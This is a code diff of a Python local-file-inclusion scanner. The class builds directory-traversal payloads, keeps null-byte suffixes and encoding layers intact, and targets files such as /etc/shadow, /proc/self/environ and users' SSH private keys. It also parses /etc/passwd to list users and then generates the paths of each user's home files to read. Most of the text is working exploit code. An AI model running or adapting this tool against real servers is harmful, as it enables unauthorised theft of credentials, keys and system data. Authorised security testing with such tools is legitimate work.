@@ -68,12 +68,12 @@ class LFIScanner:
             "name": "User Home Files",
             "payloads": [
                 ".profile",
-                # "~/.bash_history",
-                # "~/.ssh/id_rsa",
-                # "~/.ssh/authorized_keys",
-                # "~/.mysql_history",
-                # "~/Desktop/user.txt",
-                # "~/Documents/secrets.txt"
+            #     ".bash_history",
+            #     ".ssh/id_rsa",
+            #     ".ssh/authorized_keys",
+            #     ".mysql_history",
+            #     "Desktop/user.txt",
+            #     "Documents/secrets.txt"
             ]
         },
 
@@ -81,9 +81,9 @@ class LFIScanner:
                 "name": "System Files",
                 "payloads": [
                     "/etc/passwd",
-                    "/etc/shadow",
                     "/etc/hosts",
                     "/proc/self/environ",
+                    "/etc/shadow",
                     
                     # ... your static Linux paths
                 ]
@@ -393,7 +393,7 @@ class LFIScanner:
                     if remaining == 0:
                         break
                     print(f"[*] Targets remaining: {remaining}")
-                    time.sleep(1)  # Now properly imported
+                    time.sleep(.1)  # Now properly imported
 
             except KeyboardInterrupt:
                 print("[!] User interrupted scan")
@@ -411,13 +411,19 @@ class LFIScanner:
         - Sends crafted request
         - Validates successful file read"""
         """Add strict type checking"""
+
+        
+        
         # Validate target_file is string
         if not isinstance(target_file, str):
             print(f"[-] Invalid payload format: {type(target_file)} - {target_file}")
             return None
         try:
-            # Generate final payload
+            # Generate payload with preserved null bytes
             exploit_payload = self._generate_exploit_payload(base_payload, target_file)
+            # Check for double-encoded null bytes
+            exploit_payload = exploit_payload.replace('%2500', '%00').replace('%25%30%30', '%00')
+            
             print(f"[*] Testing: {exploit_payload}")
                 
 
@@ -499,74 +505,6 @@ class LFIScanner:
         ]
         return any(re.search(pattern, content) for pattern in log_patterns)
 
-
-
-    def FUCKED_UP_ONE_generate_exploit_payload(self, base_payload, target_file):
-        """Generate exploitation payload while preserving encoding layers
-
-        1. Calculate original payload's encoding depth
-        2. Fully decode to raw traversal sequence
-        3. Replace target file in decoded path
-        4. Re-apply equivalent encoding layers
-
-        Example:
-        Original: %252e%252e%252fetc/passwd (double-encoded)
-        -> Decoded: ../../etc/passwd
-        -> Modified: ../../etc/shadow
-        -> Re-encoded: %252e%252e%252fetc%252fshadow
-        """
-
-
-        """Generate exploitation payload by direct replacement of vulnerable path
-    
-        Process:
-        1. URL-decode the original payload to handle any encoding
-        2. Replace 'etc/passwd' with target file in decoded payload
-        3. Re-encode while preserving null bytes and original structure
-
-        Example:
-        Original payload: ../../../etc/passwd%00.png
-        -> Decoded: ../../../etc/passwd\x00.png
-        -> Replaced: ../../../etc/shadow\x00.png
-        -> Encoded: ../../../etc/shadow%00.png
-        """
-        payloads = []
-        # 1. Selected categories
-        for category in self.selected_categories:
-            if category in self.categories:
-                payloads.extend(self.categories[category]['payloads'])
-            
-        # 2. Custom payloads
-        # payloads.extend(self.custom_payloads)
-        payloads.extend(self.exploit_files)
-
-        # 3. Default system payloads
-        payloads.extend([
-            '/etc/passwd',
-            '/proc/self/environ',
-            'C:\Windows\win.ini'
-        ])
-
-        # Decode payload to handle URL encoding
-        decoded_payload = unquote(base_payload)
-    
-        # Extract the traversal pattern from successful payload
-        # Example: "../../../etc/passwd" -> "../../../"
-        traversal_depth = decoded_payload.split('etc/passwd')[0]
-        # Apply the same traversal to new target
-        modified = f"{traversal_depth}{target_file.lstrip('/')}"
-    
-        # Handle absolute paths differently
-        if target_file.startswith('/'):
-            # For absolute paths, replace the entire filename
-            base_name = decoded_payload.split('/')[-1]
-            modified = decoded_payload.replace(base_name, target_file.lstrip('/'))
-        else:
-            # For relative paths, use directory traversal
-            modified = decoded_payload.replace('etc/passwd', target_file)
-        
-        return quote(modified)
-
     def _generate_exploit_payload(self, base_payload, target_file):
         """Generate exploitation payload while preserving encoding layers
 
@@ -581,8 +519,6 @@ class LFIScanner:
         -> Modified: ../../etc/shadow
         -> Re-encoded: %252e%252e%252fetc%252fshadow
         """
-
-
         """Generate exploitation payload by direct replacement of vulnerable path
     
         Process:
@@ -596,38 +532,32 @@ class LFIScanner:
         -> Replaced: ../../../etc/shadow\x00.png
         -> Encoded: ../../../etc/shadow%00.png
         """   
-        payloads = []
-        # 1. Selected categories
-        for category in self.selected_categories:
-            if category in self.categories:
-                payloads.extend(self.categories[category]['payloads'])
-            
-        # 2. Custom payloads
-        # payloads.extend(self.custom_payloads)
-        payloads.extend(self.exploit_files)
-
-        # 3. Default system payloads
-        payloads.extend([
-            '/etc/passwd',
-            '/proc/self/environ',
-            'C:\Windows\win.ini'
-        ])
-
-        """Create payload that maintains traversal pattern"""
-        decoded_payload = unquote(base_payload)
-        
-        # Extract traversal pattern from successful payload (e.g., ../../../)
-        if 'etc/passwd' in decoded_payload:
-            traversal = decoded_payload.split('etc/passwd')[0]
+        """Generate payloads with guaranteed correct path structure"""
+        # Split null byte suffix if present
+        if '%00' in base_payload:
+            main_part, suffix = base_payload.split('%00', 1)
+            suffix = f'%00{suffix}'
         else:
-            traversal = decoded_payload
-        
-        # Apply traversal to new target
-        modified = f"{traversal}{target_file.lstrip('/')}"
-        
-        # Preserve original encoding style
-        return quote(modified)
+            main_part = base_payload
+            suffix = ''
 
+        decoded = unquote(main_part)
+        
+        # Regex to identify vulnerable file pattern
+        match = re.match(r'(.*?)(/etc/passwd|etc/passwd)', decoded, re.IGNORECASE)
+        
+        if match:
+            # Extract traversal sequence and normalize slashes
+            traversal = match.group(1).rstrip('/')  # Remove trailing slashes
+            modified = f"{traversal}/{target_file.lstrip('/')}"
+        else:
+            # Fallback for non-standard payloads
+            modified = f"{decoded}/{target_file.lstrip('/')}"
+
+        # Preserve original encoding style
+        encoded = quote(modified)
+        
+        return f"{encoded}{suffix}"
 
     def _extract_target_file(self, base_payload):
         """Identify reusable traversal pattern
@@ -912,8 +842,12 @@ class LFIScanner:
 
     def _extract_users_from_passwd(self, passwd_content):
         """Extract users with valid home directories and shells"""
+
+        """Handle null bytes in /etc/passwd responses"""
+         # Remove null bytes and everything after
+        clean_content = passwd_content.split('\x00')[0]
         valid_users = []
-        for line in passwd_content.split('\n'):
+        for line in clean_content.split('\n'):
             line = line.strip()
             if not line or line.startswith('#'):
                 continue
@@ -922,42 +856,37 @@ class LFIScanner:
             if len(parts) < 7:
                 continue
                 
-            username, _, _, _, _, home_dir, shell = parts[:7]
+            username = parts[0]
+            home_dir = parts[5]
             
-            # Filter criteria: 
-            # - Home directory exists and is under /home
-            # - Shell is interactive (not nologin/false)
-            if (home_dir.startswith('/home/') and 
-                '/nologin' not in shell and 
-                '/false' not in shell and
-                username not in ['root', 'daemon', 'bin']):  # Skip system users
+            if home_dir.startswith('/home/') and username not in ['root', 'daemon']:
                 valid_users.append({
                     'username': username,
                     'home': home_dir
                 })
         
-        print(f"[*] Extracted {len(valid_users)} valid users: {[u['username'] for u in valid_users]}")
         return valid_users
 
     def _generate_user_files(self, users):
-        """Generate properly encoded user paths"""
+        """Generate user paths and remove generic patterns"""
         base_patterns = self.categories['linux_users']['payloads']
         
+        # Remove generic profile patterns first
+        self.exploit_files = [f for f in self.exploit_files if f not in base_patterns]
+        
+        # Generate user-specific paths
         for user in users:
-            home_dir = user['home'].replace('\\', '/')  # Normalize paths
+            home_dir = user['home'].replace('\\', '/')
             for pattern in base_patterns:
-                # Construct absolute path
                 if pattern.startswith('~/'):
                     user_path = os.path.join(home_dir, pattern[2:])
                 else:
                     user_path = os.path.join(home_dir, pattern.lstrip('/'))
                 
-                # URL encode while preserving traversal syntax
-                encoded_path = quote(user_path).replace('%2F', '/').replace('%2E', '.')
-                
+                encoded_path = quote(user_path).replace('%2F', '/')
                 if encoded_path not in self.exploit_files:
-                    print(f"[*] Generated user path: {encoded_path}")
                     self.exploit_files.append(encoded_path)
+                    print(f"[*] Generated user path: {encoded_path}")
 
     def generate_poc_report(results):
         """Generate minimal proof-of-concept report"""
